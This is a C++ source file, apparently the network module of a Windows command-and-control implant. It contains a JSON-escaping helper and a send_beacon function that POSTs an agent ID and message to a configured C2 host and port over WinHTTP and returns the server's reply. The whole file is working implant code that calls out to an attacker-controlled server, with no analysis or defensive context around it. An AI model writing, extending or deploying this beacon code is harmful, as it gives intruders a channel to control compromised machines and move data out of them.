#include "network.h"
#include "config.h"
#include <windows.h>
#include <winhttp.h>
#include <iostream>

#pragma comment(lib, "winhttp.lib")

std::string escape_json(const std::string& input) {
	std::string output;
	for (char c : input) {
		switch (c) {
		case '\"': output += "\\\""; break;
		case '\\': output += "\\\\"; break;
		case '\b': output += "\\b";  break;
		case '\f': output += "\\f";  break;
		case '\n': output += "\\n";  break;
		case '\r': output += "\\r";  break;
		case '\t': output += "\\t";  break;
		default:
			if ('\x00' <= c && c <= '\x1f') {
				char buf[7];
				snprintf(buf, sizeof(buf), "\\u%04x", c);
				output += buf;
			}
			else {
				output += c;
			}
		}
	}
	return output;
}

std::string send_beacon(const std::string& agent_id, const std::string& message) {
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	bool success = false;
	std::string response_data = "";

	hSession = WinHttpOpen(kUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) return response_data;

	hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
	if (!hConnect) {
		WinHttpCloseHandle(hSession);
		return response_data;
	}

	hRequest = WinHttpOpenRequest(hConnect, L"POST", kBeaconPath, NULL,
		WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

	if (!hRequest) {
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return response_data;
	}

	std::string escaped_message = escape_json(message);

	// Construction du JSON
	std::string json_payload = "{\"id\": \"" + agent_id + "\", \"msg\": \"" + escaped_message + "\"}";

	BOOL bResults = WinHttpSendRequest(hRequest,
		L"Content-Type: application/json\r\n",
		-1L, (LPVOID)json_payload.c_str(),
		(DWORD)json_payload.length(),
		(DWORD)json_payload.length(), 0);

	if (bResults) {
		//Attendre la réponse du serveur
		WinHttpReceiveResponse(hRequest, NULL);

		DWORD dwSize = 0;
		DWORD dwDownloaded = 0;

		do {
			dwSize = 0;
			WinHttpQueryDataAvailable(hRequest, &dwSize);
			if (dwSize == 0) break;

			char* pszOutBuffer = new char[dwSize + 1];
			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
				response_data += std::string(pszOutBuffer, dwDownloaded);
			}
			delete[] pszOutBuffer;
		} while (dwSize > 0);
	}

	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return response_data;
}